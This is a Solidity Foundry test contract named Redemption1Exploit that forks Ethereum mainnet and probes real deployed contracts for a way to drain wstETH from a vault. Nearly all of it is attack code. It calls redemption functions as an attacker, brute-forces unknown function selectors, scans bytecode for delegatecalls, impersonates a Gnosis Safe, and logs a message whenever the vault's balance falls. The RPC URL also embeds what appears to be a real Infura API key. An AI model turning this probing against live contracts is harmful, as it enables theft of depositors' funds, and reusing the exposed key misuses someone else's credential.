// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract Redemption1Exploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant GNOSIS_SAFE = 0xB38f2aCb7B562475908c0C6E80a045Deb4023f70;
    address constant SLOT5_IMPL = 0x434B68B11bBE8FD3074089397cA3d275801d6354;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_CheckRedemption1RedeemWithAddress() public {
        console.log("=== CHECKING REDEMPTION_1 REDEEM WITH ADDRESS ===\n");

        // REDEMPTION_1 has 0x7bde82f2 = redeem(uint256,address)
        // This is the SAME selector as RC.redeem!
        // If calling this forwards to RC...

        deal(IAU, attacker, 100000e18);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_1, type(uint256).max);

        console.log("Calling REDEMPTION_1.redeem(uint256,address):");
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x7bde82f2), 100e18, attacker)
        );
        console.log("Success:", s1);
        if (!s1) {
            console.log("Error length:", d1.length);
            if (d1.length >= 4) {
                console.logBytes4(bytes4(d1));
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerWstETH = IERC20(wstETH).balanceOf(attacker);
        console.log("Vault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", attackerWstETH / 1e18);

        if (attackerWstETH > 0) {
            console.log("\n*** REDEMPTION_1 REDEEM(uint256,address) WORKED! ***");
        }
    }

    function test_AnalyzeRedemption1Delegatecalls() public view {
        console.log("=== ANALYZING REDEMPTION_1 DELEGATECALLS ===\n");

        bytes memory code = REDEMPTION_1.code;

        // Find all DELEGATECALLs
        uint dcCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) {
                dcCount++;
                console.log("\nDELEGATECALL #", dcCount, "at offset:", i);

                // Look for nearby SLOAD, PUSH20, or CALLDATALOAD
                uint start = i > 100 ? i - 100 : 0;
                for (uint j = start; j < i; j++) {
                    if (uint8(code[j]) == 0x54) {
                        // Find what slot it loads
                        if (j > 0) {
                            uint8 prevOp = uint8(code[j-1]);
                            if (prevOp >= 0x60 && prevOp <= 0x6f) {
                                uint256 slotNum = 0;
                                for (uint k = 0; k < (prevOp - 0x5f) && j + k < code.length; k++) {
                                    slotNum = slotNum << 8 | uint8(code[j - (prevOp - 0x5f) + k]);
                                }
                                console.log("  SLOAD slot:", slotNum);
                            }
                        }
                        console.log("  SLOAD at:", j);
                    }
                    if (uint8(code[j]) == 0x73) {
                        console.log("  PUSH20 at:", j);
                    }
                    if (uint8(code[j]) == 0x35) {
                        console.log("  CALLDATALOAD at:", j);
                    }
                }
            }
        }
    }

    function test_CheckRedemption1Storage() public view {
        console.log("=== CHECKING REDEMPTION_1 STORAGE ===\n");

        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(REDEMPTION_1, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("Slot", i, ":");
                console.logBytes32(slot);

                address addr = address(uint160(uint256(slot)));
                if (addr.code.length > 0) {
                    console.log("  Contract at:", addr);
                    console.log("  Code size:", addr.code.length);
                }
            }
        }
    }

    function test_TryRedemption1AsGnosisSafe() public {
        console.log("=== TRYING AS GNOSIS SAFE ===\n");

        // Slot 4 = Gnosis Safe
        // Maybe REDEMPTION_1 delegatecalls to Safe for certain functions

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // Prank as one of the Safe owners
        // First, get Safe owner from storage
        bytes32 ownerSlot = vm.load(GNOSIS_SAFE, bytes32(uint256(2)));
        console.log("Safe storage slot 2:");
        console.logBytes32(ownerSlot);

        // Gnosis Safe owners are in linked list at keccak256("owners") + ...
        // Simplified: try pranking as the Safe itself
        vm.startPrank(GNOSIS_SAFE);

        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSelector(bytes4(0x7bde82f2), 100e18, attacker)
        );
        console.log("redeem(uint256,address) as Safe:", s1);
        if (!s1 && d1.length >= 4) {
            console.logBytes4(bytes4(d1));
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** SAFE CAN DRAIN VIA REDEMPTION_1! ***");
        }
    }

    function test_CheckRedemption1DEFIActions() public {
        console.log("=== CHECKING REDEMPTION_1 DEFI ACTIONS ===\n");

        // REDEMPTION_1 has selectors like:
        // 0x778d364f - ?
        // 0x42dbe168 - ?
        // 0x252c50f3 - ?
        // 0x36600461 - ?
        // 0xa29faff0 - ?
        // 0x781b7e08 - ?
        // 0xddca3f43 - ?
        // 0x57604051 - ?

        vm.startPrank(attacker);

        console.log("Trying unknown selectors:");

        bytes4[] memory sels = new bytes4[](8);
        sels[0] = bytes4(0x778d364f);
        sels[1] = bytes4(0x42dbe168);
        sels[2] = bytes4(0x252c50f3);
        sels[3] = bytes4(0x36600461);
        sels[4] = bytes4(0xa29faff0);
        sels[5] = bytes4(0x781b7e08);
        sels[6] = bytes4(0xddca3f43);
        sels[7] = bytes4(0x57604051);

        for (uint i = 0; i < sels.length; i++) {
            // Try with (address, uint256) pattern
            (bool s1,) = REDEMPTION_1.call(
                abi.encodeWithSelector(sels[i], attacker, 100e18)
            );
            if (s1) {
                console.log("SUCCESS (addr, uint):");
                console.logBytes4(sels[i]);
            }

            // Try with no params
            (bool s2,) = REDEMPTION_1.call(
                abi.encodeWithSelector(sels[i])
            );
            if (s2) {
                console.log("SUCCESS (no params):");
                console.logBytes4(sels[i]);
            }
        }

        vm.stopPrank();
    }

    function test_CheckSelector07a2d13a() public {
        console.log("=== CHECKING SELECTOR 0x07a2d13a ===\n");

        // This selector might be previewRedeem or similar

        (bool s1, bytes memory d1) = REDEMPTION_1.staticcall(
            abi.encodeWithSelector(bytes4(0x07a2d13a), 100e18)
        );
        if (s1 && d1.length >= 32) {
            console.log("0x07a2d13a(100e18):", uint256(bytes32(d1)));
        }

        (bool s2, bytes memory d2) = REDEMPTION_1.staticcall(
            abi.encodeWithSelector(bytes4(0x07a2d13a), 100e18, attacker)
        );
        if (s2 && d2.length >= 32) {
            console.log("0x07a2d13a(100e18, attacker):", uint256(bytes32(d2)));
        }
    }

    function test_CheckSlot5Implementation() public view {
        console.log("=== CHECKING SLOT 5 IMPLEMENTATION ===\n");

        console.log("SLOT5_IMPL:", SLOT5_IMPL);
        console.log("Code size:", SLOT5_IMPL.code.length);

        if (SLOT5_IMPL.code.length > 0) {
            bytes memory code = SLOT5_IMPL.code;

            console.log("\nFunction selectors:");
            bytes4[] memory uniqueSels = new bytes4[](30);
            uint selCount = 0;

            for (uint i = 0; i + 4 < code.length; i++) {
                if (uint8(code[i]) == 0x63) {
                    bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                    if (sel == 0xffffffff || sel == bytes4(0)) continue;

                    bool isUnique = true;
                    for (uint j = 0; j < selCount; j++) {
                        if (uniqueSels[j] == sel) {
                            isUnique = false;
                            break;
                        }
                    }

                    if (isUnique && selCount < 30) {
                        uniqueSels[selCount] = sel;
                        selCount++;
                    }
                }
            }

            for (uint i = 0; i < selCount; i++) {
                console.logBytes4(uniqueSels[i]);
            }
        }
    }

    function test_TrySlot5Functions() public {
        console.log("=== TRYING SLOT 5 FUNCTIONS VIA REDEMPTION_1 ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        vm.startPrank(attacker);

        // If REDEMPTION_1 delegatecalls to SLOT5_IMPL for certain functions,
        // we need to find which ones

        // Common patterns from small contracts
        console.log("Trying common function names:");

        (bool s1,) = REDEMPTION_1.call(
            abi.encodeWithSignature("withdraw(uint256,address)", 100e18, attacker)
        );
        console.log("withdraw(uint256,address):", s1);

        (bool s2,) = REDEMPTION_1.call(
            abi.encodeWithSignature("claim(address)", attacker)
        );
        console.log("claim(address):", s2);

        (bool s3,) = REDEMPTION_1.call(
            abi.encodeWithSignature("harvest()", "")
        );
        console.log("harvest():", s3);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        if (vaultAfter < vaultBefore) {
            console.log("\n*** SLOT5 EXPLOIT WORKED! ***");
        }
    }
}
